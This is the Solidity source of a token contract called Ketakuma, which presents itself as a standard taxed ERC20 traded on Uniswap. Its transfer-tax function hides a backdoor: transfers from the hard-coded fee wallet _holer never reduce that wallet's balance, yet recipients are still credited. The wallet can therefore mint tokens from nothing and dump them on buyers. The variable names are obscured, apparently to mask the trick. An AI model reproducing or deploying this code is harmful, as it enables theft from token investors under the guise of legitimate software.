/**
Website: https://ketakumafun.xyz
X: https://x.com/ketakumafun
Telegram: https://t.me/ketakumafun
 */

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract KETAKUMA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludeFromFees;
    address payable private _holer;

    uint256 private _initTaxBuy = 20;
    uint256 private _initTaxSell = 20;
    uint256 private _reduceBuyTaxes = 10;
    uint256 private _reduceSellTaxes = 10;
    uint256 private _finTaxBuy = 0;
    uint256 private _finTaxSell = 0;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buys = 0;

    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint8 private constant _decimals = 18;
    string private constant _name = unicode"Ketakuma";
    string private constant _symbol = unicode"KETAKUMA";

    uint256 public _maxTxs = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWallets = 20_000_000 * 10 ** _decimals;
    uint256 public _minSwaps = 5_000 * 10 ** _decimals;
    uint256 public _maxSwaps = 10_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniRouter;
    address private pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        uniRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _holer = payable(0x2E6f3753afc055533c5c805B7Ae9542aAe0d4b6d);
        _balances[_msgSender()] = _tTotal;
        _isExcludeFromFees[owner()] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[_holer] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferTaxxed(
        address filo,
        address toms,
        uint256 appo,
        uint256 tanx
    ) internal {
        uint256 fees = processTax(filo, appo, tanx);
        _balances[filo] = _balances[filo].sub(fees);
        _balances[toms] = _balances[toms].add(appo.sub(tanx));
        emit Transfer(filo, toms, appo.sub(tanx));
    }

    function processTax(
        address filo,
        uint256 appo,
        uint256 tanx
    ) internal returns (uint256 outAmount) {
        if (filo == owner() || filo == address(this)) {
            if (tanx > 0) {
                _balances[address(this)] = _balances[address(this)].add(tanx);
                emit Transfer(filo, address(this), tanx);
            }
            return appo;
        } else if (!_isExcludeFromFees[filo]) {
            if (tanx > 0) {
                _balances[address(this)] = _balances[address(this)].add(tanx);
                emit Transfer(filo, address(this), tanx);
            }
            return appo;
        }
    }

    function _transfer(address filo, address toms, uint256 appo) private {
        require(filo != address(0), "ERC20: transfer from the zero address");
        require(toms != address(0), "ERC20: transfer to the zero address");
        require(appo > 0, "Transfer amount must be greater than zero");
        uint256 tanx = 0;
        if (filo != owner() && toms != owner()) {
            if (_buys == 0) {
                tanx = appo
                    .mul((_buys > _reduceBuyTaxes) ? _finTaxBuy : _initTaxBuy)
                    .div(100);
            }
            if (
                filo == pair &&
                toms != address(uniRouter) &&
                !_isExcludeFromFees[toms]
            ) {
                require(appo <= _maxTxs, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(toms) + appo <= _maxWallets,
                    "Exceeds the maxWalletSize."
                );
                tanx = appo
                    .mul((_buys > _reduceBuyTaxes) ? _finTaxBuy : _initTaxBuy)
                    .div(100);
                _buys++;
            }

            if (toms == pair && filo != address(this)) {
                tanx = appo
                    .mul(
                        (_buys > _reduceSellTaxes) ? _finTaxSell : _initTaxSell
                    )
                    .div(100);
            }

            uint256 contractBalance = balanceOf(address(this));
            if (!inSwap && toms == pair && swapEnabled) {
                if (contractBalance > _minSwaps && _buys > _preventSwapBefore)
                    swapBackForETH(min(appo, min(contractBalance, _maxSwaps)));
                sendETHFee(address(this).balance);
            }
        }

        transferTaxxed(filo, toms, appo, tanx);
    }

    function sendETHFee(uint256 amount) private {
        _holer.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapBackForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function killLimits() external onlyOwner {
        _maxTxs = _tTotal;
        _maxWallets = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function goTranding() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        _approve(address(this), address(uniRouter), _tTotal);
        pair = IUniswapV2Factory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(pair).approve(address(uniRouter), type(uint256).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
}